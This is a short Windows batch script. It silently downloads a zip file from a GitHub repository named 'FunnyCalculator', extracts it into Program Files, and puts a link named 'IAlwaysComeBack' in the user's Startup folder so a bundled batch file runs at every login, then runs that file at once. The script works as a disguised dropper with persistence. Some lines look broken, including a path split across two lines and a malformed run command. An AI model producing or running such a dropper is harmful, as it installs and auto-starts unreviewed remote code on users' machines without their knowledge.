@echo off

cd C:\"Program Files\"
curl.exe -s -O "https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/EatMyShortz.zip"
powershell -NoP -Command "Expand-Archive -LiteralPath 'EatMyShortz.zip' -DestinationPath '.' -Force"

mklink "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk" "C:\Program Files\EatMy
Shortz\IAlwaysComeBack.bat"
./C:\Program Files\EatMyShortz\IAlwaysComeBack.bat
